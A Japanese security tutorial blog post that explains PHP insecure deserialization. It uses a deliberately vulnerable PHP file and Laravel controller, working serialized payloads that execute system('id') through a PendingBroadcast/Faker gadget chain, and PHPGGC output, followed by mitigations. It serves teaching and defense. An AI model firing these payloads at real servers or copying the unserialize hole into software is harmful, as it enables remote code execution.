<div style="text-align: center;">
[f:id:motikan2010:20191105225943p:plain]
</div>  

<div class="contents-box">
  <p>[:contents]</p>
</div>

## はじめに

　OWASP Top 10 - 2017に「A8:安全でないデシリアライゼーション」がありますが、この脆弱性が顕在化
することは少なく、あまり身近ではないかなと感じています。ということで今回は本脆弱性がどういったものなのかを簡単に手元で試すことができるLaravelを用いて説明します。  
　PHPオブジェクトインジェクション(PHP Object Injection)を試すことになります。

<!-- more -->

## 環境

- PHP 7.1.3
- Laravel 5.5.48
  - PHPライブラリ `fzaninotto/faker` 1.8.0 (※ 最新版 <span><a href="https://github.com/fzaninotto/Faker/compare/v1.9.1...v1.9.2" target="_blank">1.9.2</a></span>で脆弱性修正済み)

## 事前知識

### 1つのPHPファイルでやってみる

　まず最初は Laravel を使わずに、シンプルなPHPコードを用いて説明します。  
下記のコードはクエリストリングを１つ値を取得し、その値を<b>`unserialize`関数でデシリアライズ</b>するだけのコードです。  
  
　怪しい点と言えば謎の`Clazz`クラスが定義されている点ですが、処理上呼び出されていないので問題なさそうに見えます。当脆弱性を知らない方であればなおさらそう思うはずです。  
　しかし実際はこのコードは外部からPHPコードを実行できる危険なコードとなっています。  

```php
<?php

class Clazz
{
    private $cmd;
    private $arg;

    public function __wakeup()
    {
        call_user_func($this->cmd, $this->arg);
    }
}

unserialize($_GET['param']);
```

　試しにクエリストリングに `param=TEST` を指定してアクセスしてみます。  
そうすると下記のエラーが発生しました。デシリアライズに失敗したっぽいです。 
<pre style="white-space: pre-wrap ;">
Notice: unserialize(): Error at offset 0 of 4 bytes in /Users/admin/PhpstormProjects/phpSample/index.php on line 14
</pre>

　次はこちらのパラメータ値を指定してみます。  
`param=O:5:"Clazz":2:{s:10:"%00Clazz%00cmd";s:7:"phpinfo";s:10:"%00Clazz%00arg";s:1:"1";}`    
　そうすると`phpinfo()`の実行結果が返されたはずです。  
この時点でこのコードが危険であることが分かったと思います。

　最後にダメ押しでこちらのパラメータ値を指定してみます。  
`param=O:5:"Clazz":2:{s:10:"%00Clazz%00cmd";s:6:"system";s:10:"%00Clazz%00arg";s:2:"id";}` 
　`id`コマンドが実行されます。  

### なぜOSコマンドが実行されたのか

　2つの目に指定したパラメータを例になぜコマンドが実行されたのかを説明していきます。  
まず、デシリアライズの結果を`var_dump`で確認してみます。  

　Clazzオブジェクトが生成されていることが分かります。  
それだけでなく変数`$cmd` `$arg`にもクライアント側で指定した文字列が格納されています。  

```php
<?php
// ...

var_dump(unserialize($_GET['param'])); // デシリアライズ結果を表示
/* 出力
object(Clazz)#1 (2) {
  ["cmd":"Clazz":private]=>
  string(6) "system"
  ["arg":"Clazz":private]=>
  string(2) "id"
}
*/
```

　次に確認するのが`__wakeup()`関数です。  
この関数はなにでしょうか？PHPのドキュメントに下記の説明がありました。
> unserialize() は、 特殊な名前 __wakeup() を有する 関数の存在を調べます。 もし存在する場合、この関数は、オブジェクトが有する可能性が あるあらゆるリソースを再構築することができます。

　つまり、unserialize()関数の実行時に呼び出されるマジックメソッドらしいです。  

　変数`$cmd` `$arg`に値が格納されていることを考慮すると、`__wakeup()`関数呼び出し時に`call_user_func("system", "id");`で実行され、例のコードでは外部から指定されたOSコマンド実行されるようになっていました。

```php
<?php
// ...

    public function __wakeup()
    {
        call_user_func($this->cmd, $this->arg);
    }
```

### なにが問題なのか

　なにが問題でこのような脆弱性が存在しているのかを考えてみます。  
ここでは下記の２つ問題が同時に存在しているのでこのような脆弱性が存在するようになっています。

- `__wakeup()`関数が呼び出されている
- `unserialize()`関数に任意の値が渡されている

## Laravel でやってみる

　ここからが本題です。適当にLaravelのプロジェクト作成し、本脆弱性の動作を確認してみます。  
脆弱性を作る為に下記のコードを記述します。（ルーティングも修正しています）

#### 修正内容

▼ 初期プロジェクトからの差分  
[https://github.com/motikan2010/Insecure-Deserialization-for-Laravel/commit/a7fb6483b4f648334417c9d3eb9a4885dee31bf4:title]

```php
<?php
namespace App\Http\Controllers;
use Illuminate\Http\Request;

class IndexController extends Controller
{
    public function indexPage(Request $request) {
        $serializedInfo = $request->input('info');

        // GETパラメータをオブジェクトへでシリアライズ
        $info = unserialize($serializedInfo);

        // 名前・年齢のいずれかが取得できない場合はダミー値を設定
        if( !isset($info->name) || !isset($info->name) ) {
            $info = new \stdClass();
            $info->name = 'Dummy Name';
            $info->age = 999;
        }

        // 「名前 (年齢)」の形式で返す
        return "{$info->name} ({$info->age})";
    }
}
```

　軽くコードを見てみます。このコードは「`unserialize()`関数に任意の値が渡されている」という条件を満たしています。  

　しかし、先出したClazzクラスのように`__wakeup()`関数を持っているクラスが見当たらず、「__wakeup()関数が呼び出されている」という条件を満たしていないので、外部からOSコマンドを実行することはできなさそうです。  

　ですが、実際はOSコマンドが実行できるコードとなっています。その挙動を確認してみます。

#### 脆弱性の確認

　まずはこのアプリがどのようなアプリであるのか確認するため、普通にアクセスしてみます。  
下記のURLでアクセスしてみると`taro (10)`と表示されます。
<pre style="white-space: pre-wrap;">
http://127.0.0.1:8000/?info=O:8:%22stdClass%22:2:{s:4:%22name%22;s:4:%22taro%22;s:3:%22age%22;i:10;}
</pre>
　`info`パラメータに指定された値をデシリアライズして取得したオブジェクトを返却しています。

   次はこのURLでアクセスしてみます。
<div class="md-code" style="width:100%">
<pre style="white-space: pre-wrap;">
http://127.0.0.1:8000/?info=O:40:%22Illuminate\Broadcasting\PendingBroadcast%22:2:{S:9:%22%00*%00events%22;O:15:%22Faker\Generator%22:1:{S:13:%22%00*%00formatters%22;a:1:{S:8:%22dispatch%22;S:6:%22system%22;}}S:8:%22%00*%00event%22;S:2:%22id%22;}
</pre>
</div>

　OSコマンド実行されました。idコマンドの結果が表示されています。  
<pre style="white-space: pre-wrap;">
uid=501(admin) gid=20(staff) groups=20(staff),502(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),401(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
Dummy Name (999)
</pre>

#### OSコマンド呼び出し部分の確認

　このコードには`__wakeup()`関数も存在しておらず、さらにはOSコマンド呼び出し関数も存在していないのになぜOSコマンドが実行されたのでしょうか。どの部分で実行されたのでしょうか。  
  
　デシリアライズで生成されたオブジェクトを見てみるとその原因が分かります。  
`$info`をvar_dump()で見てみます。

```
object(Illuminate\Broadcasting\PendingBroadcast)#185 (2) {
  ["events":protected]=>
  object(Faker\Generator)#180 (2) {
    ["providers":protected]=>
    array(0) {
    }
    ["formatters":protected]=>
    array(1) {
      ["dispatch"]=>
      string(6) "system"
    }
  }
  ["event":protected]=>
  string(2) "id"
}
```

　<b>この出力情報をもとに生成されたオブジェクトを簡単に説明すると以下のようになります。</b>

- Illuminate\Broadcasting\PendingBroadcast クラスのオブジェクト
- PendingBroadcastオブジェクト events変数 には Faker\Generatorクラスのオブジェクト
  - Generatorオブジェクト formatters変数 には 連想配列（["dispatch" => "system"]）
- PendingBroadcastオブジェクト event変数 には「"id"」の文字列

　急に出てきた「<span class="m-y">PendingBroadcastクラス</span>」と「<span class="m-y">Generatorクラス</span>」とは何でしょうか。  
このクラスは Laravel プロジェクト作成時に含まれるクラスです (vendor/ 配下にあります)。そして、このクラスを使う・使わないに関わらず参照することが可能なクラスです。  
  
　この2つのクラスの中身を見てみるとなぜOSコマンドが実行されたのかが分かるはずです。  
では実際に見ていきます。下に記述しているコードは本脆弱性に関係ある部分を抜粋したものです。

##### Illuminate/Broadcasting/PendingBroadcast クラス

　ここで重要なものが`__destruct()`関数です。  
`__destruct()`関数はデストラクタメソッドで<span class="m-y">オブジェクトへの参照がなくなった時に呼び出される関数</span>です。  
つまり、<span class="m-y">indexPageアクションから抜けるタイミングで実行される関数</span>であり、先出の例の`__wakeup()`関数の代わりをしています。

　この関数の中身に、Generatorオブジェクトのdispatch関数を呼び出す処理が記述されています。  
次は呼び出し先である Generatorクラス の中身を見てみます。

`vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php`

```php
<?php
namespace Illuminate\Broadcasting;

class PendingBroadcast
{
    protected $events; // Faker\Generator クラス

    protected $event; // "id"

    public function __destruct()
    {
        $this->events->dispatch($this->event);
    }
}
```

##### Faker/Generator クラス

　`dispatch`関数が存在していないので、<span class="m-y">`__call()`関数が呼び出されます。</span>  
`__call()`関数は、存在しない関数が呼び出された場合に代わりに呼び出される関数です。  

　後は`format関数`が呼び出されてその中で`call_user_func_array`関数が呼び出されてOSコマンド実行される流れとなっています。

`vendor/fzaninotto/faker/src/Faker/Generator.php`

```php
<?php
namespace Faker;

class Generator
{
    protected $formatters = array(); // [ "dispatch" => "system" ]

    public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments); // call_user_func_array("system", ["id"])
    }

    public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter]; // "system"
        }
        // ...
    }

    public function __call($method, $attributes)
    {
        return $this->format($method, $attributes); // $method = dispatch, $attributes = ["id"]
    }
}
```

## PHPGGC（PHP Generic Gadget Chains）

　本記事では PendingBroadcastクラス と Generatorクラス を組み合わせて攻撃を実現することができますが、この攻撃方法（確認するために用いたシリアライズ文字列）だと他のフレームワークで確認することはできません。両クラスを参照できる環境下でのみ確認することができます。  

　別のフレームワークで本脆弱性を確認する場合、条件に合致するクラスを探さなくてはならないと思われますが、フレームワーク毎にPoC（Proof of Concept）を生成してくれる「PHPGGC」というツールが存在しています。

[https://github.com/ambionics/phpggc:embed:cite]


#### PoCを出力する

　「-s」オプションすると Null文字(%00) が表示されるようになります。  

<div class="md-code" style="width:100%">
```
$ ./phpggc -s Laravel/RCE1 system 'id'
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"%00*%00events"%3BO:15:"Faker\Generator":1:{s:13:"%00*%00formatters"%3Ba:1:{s:8:"dispatch"%3Bs:6:"system"%3B}}s:8:"%00*%00event"%3Bs:2:"id"%3B}
```
</div>

## 対策

### `unserialize`関数に渡す値はバリデーションを行う

　外部から渡された値の内容はしっかりとチェックしましょう。（当然！）

### `allowed_classes`オプションの付与（※非推奨な対策）  

　PHP 7.0.0 から`unserialize`関数のオプションに`allowed_classes`オプションを付与することで、外部から渡された値を基にオブジェクトが生成されなくすることができます。  
しかし、ドキュメント上ではこの方法での対策は推奨していません。バリデーションをしっかりやりましょう。  

　PHP 7.0.0 以前のバージョンで動作させる場合に、このオプションが有効にならないからだと考えられます。  

<div class="md-code" style="width:100%">
```php
<?php
// 省略時と同じ動作
unserialize($serializedInfo, ['allowed_classes' => true]);

// 外部から渡された値を基にオブジェクトが生成されず、「__PHP_Incomplete_Class」オブジェクトが生成される。
unserialize($serializedInfo, ['allowed_classes' => false]);
/*出力 =>
object(__PHP_Incomplete_Class)#266 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(40) "Illuminate\Broadcasting\PendingBroadcast"
  ["events":protected]=>
  object(__PHP_Incomplete_Class)#267 (2) {
    ["__PHP_Incomplete_Class_Name"]=>
    string(15) "Faker\Generator"
    ["formatters":protected]=>
    array(1) {
      ["dispatch"]=>
      string(6) "system"
    }
  }
  ["event":protected]=>
  string(2) "id"
*/

// 配列で指定されたクラスのオブジェクトは生成する。今回の攻撃は成功する。
unserialize($serializedInfo, ['allowed_classes' => ['Illuminate\Broadcasting\PendingBroadcast', 'Faker\Generator']]);
```
</div>

　ちなみに、Laravel 6.1.0 はこの方法で対策されている部分がありました。  
https://github.com/laravel/framework/blob/6.x/src/Illuminate/Auth/Recaller.php#L24

## まとめ

　外部からの入力値を`unserialize()`関数に渡す処理を見かけることが少ないということもあり、耳にする機会が少ない「安全でないデシリアライゼーション」という脆弱性ですが、任意のコードが実行される影響があり非常に危ない脆弱性です。  

そのため`unserialize()`関数を利用する際は注意をしてみてください。

## 更新履歴

- 2019年11月 5日 新規作成
- 2019年11月 7日 対策追加 - オプションの付与

　
